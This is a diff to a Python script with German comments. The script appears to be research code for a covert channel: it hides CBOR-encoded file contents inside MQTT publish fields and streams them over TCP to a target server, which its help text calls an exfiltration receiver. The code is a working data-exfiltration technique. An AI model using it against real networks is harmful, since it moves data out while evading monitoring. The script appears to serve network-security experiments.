@@ -13,6 +13,9 @@ parser.add_argument("-s", "--Segment", action="store_true", help = "Segement pac
 parser.add_argument("-t", "--Target", help = "IP address of server to send exfiltration data to")
 args = parser.parse_args()
 
+# SEG
+#   -> True: Packetgröße auf MTU limitieren
+#   -> False: Beliebige Packetgröße (ein Packet mit vollständigem Payload)
 SEG = False
 if args.Segment == True: SEG = True
 
@@ -40,42 +43,24 @@ if size == 500:
     content = readFromFile("data_05mb.json")
 else:
     content = readFromFile(f"data_{size}mb.json")    # bytes von CBOR speichern
-#print(type(content))
-#print(len(content))
+
 print("Hash of CBOR-encoded content:\n" + sha256(content).hexdigest() + " (Check at receiver!)")
 print("Length of payload bytestream: " + str(len(content)) + "\n")
 crwaler =  CBORIterator(content)
 
 
-"""p = mqtt.MQTT()/mqtt.MQTTConnect(clientId=byte_data[:5],
-                                 willflag=1, usernameflag=1, passwordflag=1,
-                                 willtopic=byte_data[5:10], willmsg=byte_data[10:15],
-                                 username=byte_data[15:20], password=byte_data[20:25],
-                                 protoname='MQTT', cleansess=1, klive=60, protolevel=6)
-a = mqtt.MQTT(QOS=1)/mqtt.MQTTPublish(msgid=1, topic=byte_data[0:14], value=byte_data[14:])
-
-test = mqtt.MQTT()/mqtt.MQTTConnect(clientId=crwaler.getNextBytes(5),
-                                 willflag=1, usernameflag=1, passwordflag=1,
-                                 willtopic=crwaler.getNextBytes(5), willmsg=crwaler.getNextBytes(5),
-                                 username=crwaler.getNextBytes(5), password=crwaler.getNextBytes(5),
-                                 protoname='MQTT', cleansess=1, klive=60, protolevel=6)
-test = mqtt.MQTT(QOS=1)/mqtt.MQTTPublish(msgid=1, topic=content[:14], value=content[14:1507])"""
-
-
 # Socket TCP-Verbindung aufbauen
-# Publish -> 1453 Böcke
 packet_counter = 0
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.connect((SERVER_IP, 1883))  # Verbinden
 
     print("START sending packets")
-    while crwaler.getRemainingLength() >= PSIZE and SEG:
-        packet = mqtt.MQTT(QOS=1)/mqtt.MQTTPublish(msgid=int.from_bytes(crwaler.getNextBytes(2), "big"), topic=crwaler.getNextBytes(14), value=crwaler.getNextBytes(1439))
+    while crwaler.getRemainingLength() >= PSIZE and SEG:    # Payload aufteilen
+        packet = mqtt.MQTT(QOS=1)/mqtt.MQTTPublish(msgid=int.from_bytes(crwaler.getNextBytes(2), "big"), topic=crwaler.getNextBytes(14), value=crwaler.getNextBytes(1439))  # MQTT Packet erstellen
         s.send(bytes(packet))
         packet_counter += 1
-        #print(len(packet))
     
-    packet = mqtt.MQTT(QOS=1)/mqtt.MQTTPublish(msgid=int.from_bytes(crwaler.getNextBytes(2), "big"), topic=crwaler.getNextBytes(14), value=crwaler.getRemainingBytes())
+    packet = mqtt.MQTT(QOS=1)/mqtt.MQTTPublish(msgid=int.from_bytes(crwaler.getNextBytes(2), "big"), topic=crwaler.getNextBytes(14), value=crwaler.getRemainingBytes())     # restliche bytes senden
     s.send(bytes(packet))
     print("FINISHED sending packets")
 #    print("Last packet sent: ")
